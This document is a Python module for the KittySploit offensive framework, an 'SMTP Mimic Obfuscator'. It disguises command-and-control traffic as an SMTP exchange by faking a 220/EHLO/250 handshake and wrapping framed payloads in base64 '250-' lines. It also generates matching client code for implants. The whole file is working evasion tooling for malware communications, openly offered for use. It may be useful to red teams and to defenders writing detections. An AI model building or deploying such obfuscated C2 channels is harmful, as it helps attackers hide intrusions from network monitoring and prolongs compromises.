#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import struct
from typing import Optional
from kittysploit import *

# SMTP handshake: server greeting + EHLO response
SMTP_SERVER_GREETING = b"220 localhost ESMTP KittySploit\r\n"
SMTP_SERVER_EHLO_RESPONSE = (
    b"250-localhost Hello\r\n"
    b"250-SIZE 52428800\r\n"
    b"250 PIPELINING\r\n"
)
# Client sends EHLO (handshake)
SMTP_CLIENT_EHLO = b"EHLO localhost\r\n"

# Max line length for base64 (SMTP line ~998, we use 76 like MIME)
B64_LINE_LEN = 76
CRLF = b"\r\n"


class Module(Obfuscator):

    SUPPORTED_CLIENT_LANGUAGES = ["python"]

    __info__ = {
        "name": "SMTP Mimic Obfuscator",
        "description": "Simulates SMTP handshake (220/EHLO/250) then wraps C2 in SMTP-like base64 lines.",
        "author": "KittySploit Team",
        "version": "1.0.0",
    }

    _decode_buffer = None
    _first_encode_done = False
    _decode_b64_buffer = None

    def _encode_frame(self, payload: bytes) -> bytes:
        """Frame: 4-byte big-endian length + payload, base64, split into 250-/250 lines."""
        if not payload:
            return b""
        length = struct.pack(">I", len(payload))
        b64 = base64.b64encode(length + payload).decode("ascii")
        lines = []
        i = 0
        while i < len(b64):
            chunk = b64[i : i + B64_LINE_LEN]
            i += B64_LINE_LEN
            prefix = b"250-" if i < len(b64) else b"250 "
            lines.append(prefix + chunk.encode("ascii") + CRLF)
        return b"".join(lines)

    def encode(self, data: bytes, offset: int = 0) -> bytes:
        """First call: prepend SMTP server handshake then frame. Next: frame only."""
        if not data:
            return data
        out = []
        if not self._first_encode_done:
            out.append(SMTP_SERVER_GREETING)
            out.append(SMTP_SERVER_EHLO_RESPONSE)
            self._first_encode_done = True
        out.append(self._encode_frame(data))
        return b"".join(out)

    def decode(self, data: bytes, offset: int = 0) -> bytes:
        """Parse SMTP-like lines; skip handshake (EHLO/220/250), return decoded payloads from 250-/250 lines."""
        if not data:
            return data
        if self._decode_buffer is None:
            self._decode_buffer = bytearray()
        if self._decode_b64_buffer is None:
            self._decode_b64_buffer = bytearray()
        self._decode_buffer.extend(data)
        out = []
        while True:
            idx = self._decode_buffer.find(b"\r\n")
            if idx == -1:
                idx = self._decode_buffer.find(b"\n")
            if idx == -1:
                break
            if self._decode_buffer.find(b"\r\n") == idx:
                line_len = idx + 2
            else:
                line_len = idx + 1
            line = bytes(self._decode_buffer[:line_len])
            del self._decode_buffer[:line_len]
            line_stripped = line.strip()
            if line_stripped.startswith(b"EHLO ") or line_stripped.startswith(b"HELO ") or line_stripped.startswith(b"220 "):
                continue
            if line_stripped.startswith(b"250-"):
                self._decode_b64_buffer.extend(line_stripped[4:])
                continue
            if line_stripped.startswith(b"250 "):
                self._decode_b64_buffer.extend(line_stripped[4:])
                try:
                    b64_joined = self._decode_b64_buffer.decode("ascii")
                    raw = base64.b64decode(b64_joined)
                    if len(raw) >= 4:
                        length = struct.unpack(">I", raw[:4])[0]
                        if 0 <= length <= len(raw) - 4 and length <= 1024 * 1024:
                            out.append(raw[4 : 4 + length])
                except Exception:
                    pass
                self._decode_b64_buffer.clear()
        return b"".join(out)

    def generate_client_code(self, language: str) -> Optional[str]:
        """Generate Python: send EHLO once, then _obf_encode (frame as 250- lines), _obf_decode (parse 250- lines)."""
        if language != "python":
            return None
        ehlo_hex = SMTP_CLIENT_EHLO.hex()
        return (
            "_obf_buf=bytearray()\n"
            "_obf_b64_buf=bytearray()\n"
            "_obf_ehlo=bytes.fromhex('" + ehlo_hex + "')\n"
            "def _obf_send_handshake(sock):\n"
            " sock.sendall(_obf_ehlo)\n"
            "def _obf_encode(d):\n"
            " import base64,struct\n"
            " if not d: return d\n"
            " L=struct.pack('>I',len(d)); b=base64.b64encode(L+d).decode('ascii')\n"
            " out=[]; i=0\n"
            " while i<len(b):\n"
            "  c=b[i:i+76]; i+=76\n"
            "  p=b'250-' if i<len(b) else b'250 '\n"
            "  out.append(p+c.encode('ascii')+b'\\r\\n')\n"
            " return b''.join(out)\n"
            "def _obf_decode(d):\n"
            " import base64,struct\n"
            " _obf_buf.extend(d)\n"
            " out=[]\n"
            " while True:\n"
            "  i=_obf_buf.find(b'\\r\\n')\n"
            "  if i==-1: i=_obf_buf.find(b'\\n')\n"
            "  if i==-1: break\n"
            "  line=bytes(_obf_buf[:i+2 if _obf_buf[:i+2].endswith(b'\\r\\n') else i+1]); del _obf_buf[:len(line)]\n"
            "  line=line.strip()\n"
            "  if line.startswith(b'220 ') or line.startswith(b'EHLO') or line.startswith(b'HELO'): continue\n"
            "  if line.startswith(b'250-'): _obf_b64_buf.extend(line[4:]); continue\n"
            "  if line.startswith(b'250 '):\n"
            "   _obf_b64_buf.extend(line[4:])\n"
            "   try:\n"
            "    raw=base64.b64decode(_obf_b64_buf.decode('ascii'))\n"
            "    if len(raw)>=4:\n"
            "     ln=struct.unpack('>I',raw[:4])[0]\n"
            "     if ln<=len(raw)-4: out.append(raw[4:4+ln])\n"
            "   except: pass\n"
            "   _obf_b64_buf.clear()\n"
            " return b''.join(out)\n"
        )
